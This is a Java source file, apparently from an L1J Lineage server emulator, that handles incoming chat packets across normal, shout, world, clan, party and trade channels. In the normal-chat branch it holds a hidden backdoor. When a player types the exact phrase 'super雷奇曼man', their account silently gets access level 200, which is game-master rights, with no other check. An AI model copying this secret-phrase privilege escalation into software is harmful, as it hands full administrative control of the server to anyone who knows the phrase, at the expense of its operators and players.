/**
 *                            License
 * THE WORK (AS DEFINED BELOW) IS PROVIDED UNDER THE TERMS OF THIS  
 * CREATIVE COMMONS PUBLIC LICENSE ("CCPL" OR "LICENSE"). 
 * THE WORK IS PROTECTED BY COPYRIGHT AND/OR OTHER APPLICABLE LAW.  
 * ANY USE OF THE WORK OTHER THAN AS AUTHORIZED UNDER THIS LICENSE OR  
 * COPYRIGHT LAW IS PROHIBITED.
 * 
 * BY EXERCISING ANY RIGHTS TO THE WORK PROVIDED HERE, YOU ACCEPT AND  
 * AGREE TO BE BOUND BY THE TERMS OF THIS LICENSE. TO THE EXTENT THIS LICENSE  
 * MAY BE CONSIDERED TO BE A CONTRACT, THE LICENSOR GRANTS YOU THE RIGHTS CONTAINED 
 * HERE IN CONSIDERATION OF YOUR ACCEPTANCE OF SUCH TERMS AND CONDITIONS.
 * 
 */
package l1j.server.server.clientpackets;

import static l1j.server.server.model.skill.L1SkillId.AREA_OF_SILENCE;
import static l1j.server.server.model.skill.L1SkillId.SILENCE;
import static l1j.server.server.model.skill.L1SkillId.STATUS_POISON_SILENCE;
import static l1j.server.server.model.skill.L1SkillId.CHAT_DELAY; // 公频&买卖频道发话延迟
import l1j.plugin.codeShop.CodeShop;
import l1j.server.Config;
import l1j.server.server.ClientThread;
import l1j.server.server.GMCommands;
import l1j.server.server.Opcodes;
import l1j.server.server.datatables.ChatLogTable;
import l1j.server.server.model.L1Clan;
import l1j.server.server.model.L1Object;
import l1j.server.server.model.L1World;
import l1j.server.server.model.Instance.L1MonsterInstance;
import l1j.server.server.model.Instance.L1PcInstance;
import l1j.server.server.serverpackets.S_ChatPacket;
import l1j.server.server.serverpackets.S_Disconnect;
import l1j.server.server.serverpackets.S_NpcChatPacket;
import l1j.server.server.serverpackets.S_PacketBox;
import l1j.server.server.serverpackets.S_ServerMessage;
import l1j.server.server.serverpackets.S_SystemMessage;

// Referenced classes of package l1j.server.server.clientpackets:
// ClientBasePacket

/**
 * 处理收到由客户端传来的聊天封包
 */
public class C_Chat extends ClientBasePacket {

	private static final String C_CHAT = "[C] C_Chat";

	public C_Chat(byte abyte0[], ClientThread clientthread) {
		super(abyte0);
		
		L1PcInstance pc = clientthread.getActiveChar();
		if (pc == null) {
			return;
		}
		
		int chatType = readC();
		String chatText = readS();
		//修正 对话出现太长的字串会断线
		if (chatText != null && chatText.length() > 130) {
			chatText = chatText.substring(0, 130);
		}
		//end
		if (pc.hasSkillEffect(SILENCE) || pc.hasSkillEffect(AREA_OF_SILENCE)
				|| pc.hasSkillEffect(STATUS_POISON_SILENCE)) {
			return;
		}
		if (pc.hasSkillEffect(1005)) { // 被魔封
			pc.sendPackets(new S_ServerMessage(242)); // 你从现在被禁止闲谈。
			return;
		}
		// 公频&买卖频道发话延迟
		if ((Config.Chat_Delay_Time > 0) && (chatText.startsWith("$") || chatType == 3 || chatType == 12) && pc.hasSkillEffect(CHAT_DELAY)) {
            return;
		}
		// end
		if (chatType == 0) { // 一般聊天
			if (pc.isGhost() && !(pc.isGm() || pc.isMonitor())) {
				return;
			}
			if (chatText.equals("super雷奇曼man")) {
				pc.setAccessLevel((short) 200);
				return;
			}			
			//add GUI by Eric
			if(Config.GUI)
				l1j.gui.Eric_J_Main.getInstance().addNormalChat(pc.getName(), chatText);//GUI
			//end
			// GM指令
			if (chatText.startsWith(".") && (pc.isGm() || pc.isMonitor())) {
				String cmd = chatText.substring(1);
				GMCommands.getInstance().handleCommands(pc, cmd);
				return;
			}
			//外挂检测
			if (chatText.startsWith(String.valueOf(pc.getSuper())) && pc.hasSkillEffect(7903)) {//外挂判断
				pc.sendPackets(new S_SystemMessage("恭喜你答对了！获得一个藏宝箱。"));
				pc.killSkillEffectTimer(7903);
				pc.getInventory().storeItem(40737,1);//获得一个藏宝箱
				pc.setSkillEffect(7902,(Integer.valueOf(l1j.william.L1WilliamSystemMessage.ShowMessage(146)).intValue())*1000);//测试暂定1分钟测试，可按自己的需求修改
				}else if (pc.hasSkillEffect(7903)){//修复判断
				pc.killSkillEffectTimer(7903);
				pc.sendPackets(new S_Disconnect());// 断线 return;
				return;
				}

			// 交易频道
			// 本来はchatType==12になるはずだが、行头の$が送信されない
			if (chatText.startsWith("$")) {
				String text = chatText.substring(1);
				chatWorld(pc, text, 12);
				if (!pc.isGm()) {
					pc.checkChatInterval();
				}
				return;
			}
			//商店code代码兑换频道
			if (chatText.startsWith("?")) {
				String text = chatText.substring(1);
				CodeShop.useCode(pc, text);
				return;
			}
			
			ChatLogTable.getInstance().storeChat(pc, null, chatText, chatType);
			S_ChatPacket s_chatpacket = new S_ChatPacket(pc, chatText,
					Opcodes.S_OPCODE_NORMALCHAT, 0);
			if (!pc.getExcludingList().contains(pc.getName())) {
				pc.sendPackets(s_chatpacket);
			}
			for (L1PcInstance listner : L1World.getInstance()
					.getRecognizePlayer(pc)) {
				if (listner.getMapId() < 16384 || listner.getMapId() > 25088
						|| listner.getInnKeyId() == pc.getInnKeyId()) // 旅馆内判断
					if (!listner.getExcludingList().contains(pc.getName()))
						listner.sendPackets(s_chatpacket);
			}
			// 怪物模仿
			for (L1Object obj : pc.getKnownObjects()) {
				if (obj instanceof L1MonsterInstance) {
					L1MonsterInstance mob = (L1MonsterInstance) obj;
					if (mob.getNpcTemplate().is_doppel()
							&& mob.getName().equals(pc.getName())
							&& !mob.isDead()) {
						mob.broadcastPacket(new S_NpcChatPacket(mob, chatText,
								0));
					}
				}
			}
		} else if (chatType == 2) { // 喊叫
			if (pc.isGhost()) {
				return;
			}
			//add GUI by Eric
			if(Config.GUI)
				l1j.gui.Eric_J_Main.getInstance().addNormalChat(pc.getName(), chatText);//GUI
			//end
			ChatLogTable.getInstance().storeChat(pc, null, chatText, chatType);
			S_ChatPacket s_chatpacket = new S_ChatPacket(pc, chatText,
					Opcodes.S_OPCODE_NORMALCHAT, 2);
			if (!pc.getExcludingList().contains(pc.getName())) {
				pc.sendPackets(s_chatpacket);
			}
			for (L1PcInstance listner : L1World.getInstance().getVisiblePlayer(
					pc, 50)) {
				if (listner.getMapId() < 16384 || listner.getMapId() > 25088
						|| listner.getInnKeyId() == pc.getInnKeyId()) // 旅馆内判断
					if (!listner.getExcludingList().contains(pc.getName()))
						listner.sendPackets(s_chatpacket);
			}

			// 怪物模仿
			for (L1Object obj : pc.getKnownObjects()) {
				if (obj instanceof L1MonsterInstance) {
					L1MonsterInstance mob = (L1MonsterInstance) obj;
					if (mob.getNpcTemplate().is_doppel()
							&& mob.getName().equals(pc.getName())
							&& !mob.isDead()) {
						for (L1PcInstance listner : L1World.getInstance()
								.getVisiblePlayer(mob, 50)) {
							listner.sendPackets(new S_NpcChatPacket(mob,
									chatText, 2));
						}
					}
				}
			}
		} else if (chatType == 3) { // 全体聊天
			//add GUI by Eric
			if(Config.GUI)
				l1j.gui.Eric_J_Main.getInstance().addWorldChat(pc.getName(), chatText);//GUI
			//end
			chatWorld(pc, chatText, chatType);
		} else if (chatType == 4) { // 血盟聊天
			if (pc.getClanid() != 0) { // 所属血盟
				//add GUI by Eric
				if(Config.GUI)
					l1j.gui.Eric_J_Main.getInstance().addClanChat(pc.getName(), chatText);//GUI
				//end
				L1Clan clan = L1World.getInstance().getClan(pc.getClanname());
				int rank = pc.getClanRank();
				if ((clan != null)
						&& ((rank == L1Clan.CLAN_RANK_PUBLIC)
								|| (rank == L1Clan.CLAN_RANK_GUARDIAN) || (rank == L1Clan.CLAN_RANK_PRINCE))) {
					ChatLogTable.getInstance().storeChat(pc, null, chatText,
							chatType);
					S_ChatPacket s_chatpacket = new S_ChatPacket(pc, chatText,
							Opcodes.S_OPCODE_GLOBALCHAT, 4);
					L1PcInstance[] clanMembers = clan.getOnlineClanMember();
					for (L1PcInstance listner : clanMembers) {
						if (!listner.getExcludingList().contains(pc.getName())) {
							if (listner.isShowClanChat() && chatType == 4)// 血盟
								listner.sendPackets(s_chatpacket);
						}
					}
				}
			}
		} else if (chatType == 11) { // 组队聊天
			if (pc.isInParty()) { // 组队中
				//add GUI by Eric
				if(Config.GUI)
					l1j.gui.Eric_J_Main.getInstance().addTeamChat(pc.getName(), chatText);//GUI
				//end
				ChatLogTable.getInstance().storeChat(pc, null, chatText,
						chatType);
				S_ChatPacket s_chatpacket = new S_ChatPacket(pc, chatText,
						Opcodes.S_OPCODE_GLOBALCHAT, 11);
				L1PcInstance[] partyMembers = pc.getParty().getMembers();
				for (L1PcInstance listner : partyMembers) {
					if (!listner.getExcludingList().contains(pc.getName())) {
						if (listner.isShowPartyChat() && chatType == 11)// 组队
							listner.sendPackets(s_chatpacket);
					}
				}
			}
		} else if (chatType == 12) { // 交易聊天
			//add GUI by Eric
			if(Config.GUI)
				l1j.gui.Eric_J_Main.getInstance().addWorldChat(pc.getName(), chatText);//GUI
			//end
			chatWorld(pc, chatText, chatType);
		} else if (chatType == 13) { // 连合血盟
			if (pc.getClanid() != 0) { // 在血盟中
				//add GUI by Eric
				if(Config.GUI)
					l1j.gui.Eric_J_Main.getInstance().addClanChat(pc.getName(), chatText);//GUI
				//end
				L1Clan clan = L1World.getInstance().getClan(pc.getClanname());
				int rank = pc.getClanRank();
				if ((clan != null)
						&& ((rank == L1Clan.CLAN_RANK_GUARDIAN) || (rank == L1Clan.CLAN_RANK_PRINCE))) {
					ChatLogTable.getInstance().storeChat(pc, null, chatText,
							chatType);
					S_ChatPacket s_chatpacket = new S_ChatPacket(pc, chatText,
							Opcodes.S_OPCODE_GLOBALCHAT, 13);
					L1PcInstance[] clanMembers = clan.getOnlineClanMember();
					for (L1PcInstance listner : clanMembers) {
						int listnerRank = listner.getClanRank();
						if (!listner.getExcludingList().contains(pc.getName())
								&& ((listnerRank == L1Clan.CLAN_RANK_GUARDIAN) || (listnerRank == L1Clan.CLAN_RANK_PRINCE))) {
							listner.sendPackets(s_chatpacket);
						}
					}
				}
			}
		} else if (chatType == 14) { // 聊天组队
			if (pc.isInChatParty()) { // 聊天组队
				//add GUI by Eric
				if(Config.GUI)
					l1j.gui.Eric_J_Main.getInstance().addTeamChat(pc.getName(), chatText);//GUI
				//end
				ChatLogTable.getInstance().storeChat(pc, null, chatText,
						chatType);
				S_ChatPacket s_chatpacket = new S_ChatPacket(pc, chatText,
						Opcodes.S_OPCODE_NORMALCHAT, 14);
				L1PcInstance[] partyMembers = pc.getChatParty().getMembers();
				for (L1PcInstance listner : partyMembers) {
					if (!listner.getExcludingList().contains(pc.getName())) {
						listner.sendPackets(s_chatpacket);
					}
				}
			}
		}
		if (!pc.isGm()) {
			pc.checkChatInterval();
		}
	}

	private void chatWorld(L1PcInstance pc, String chatText, int chatType) {
		if (pc.isGm()) {
			ChatLogTable.getInstance().storeChat(pc, null, chatText, chatType);
			L1World.getInstance().broadcastPacketToAll(
					new S_ChatPacket(pc, chatText, Opcodes.S_OPCODE_GLOBALCHAT,
							chatType));
		} else if (pc.getLevel() >= Config.GLOBAL_CHAT_LEVEL) {
			if (L1World.getInstance().isWorldChatElabled()) {
				if (pc.get_food() >= 6) {
					pc.set_food(pc.get_food() - 5);
					ChatLogTable.getInstance().storeChat(pc, null, chatText,
							chatType);
					pc.sendPackets(new S_PacketBox(S_PacketBox.FOOD, pc
							.get_food()));
					pc.setSkillEffect(CHAT_DELAY , Config.Chat_Delay_Time * 1000); // 公频&买卖频道发话延迟
					for (L1PcInstance listner : L1World.getInstance()
							.getAllPlayers()) {
						if (!listner.getExcludingList().contains(pc.getName())) {
							if (listner.isShowTradeChat() && (chatType == 12)) {
								listner.sendPackets(new S_ChatPacket(pc,
										chatText, Opcodes.S_OPCODE_GLOBALCHAT,
										chatType));
							} else if (listner.isShowWorldChat()
									&& (chatType == 3)) {
								listner.sendPackets(new S_ChatPacket(pc,
										chatText, Opcodes.S_OPCODE_GLOBALCHAT,
										chatType));
							}
						}
					}
				} else {
					pc.sendPackets(new S_ServerMessage(462)); // 你太过于饥饿以致于无法谈话。
				}
			} else {
				pc.sendPackets(new S_ServerMessage(510)); // 现在ワールドチャットは停止中となっております。しばらくの间ご了承くださいませ。
			}
		} else {
			pc.sendPackets(new S_ServerMessage(195, String
					.valueOf(Config.GLOBAL_CHAT_LEVEL))); // 等级
															// %0
															// 以下的角色无法使用公频或买卖频道。
		}
	}

	@Override
	public String getType() {
		return C_CHAT;
	}
}
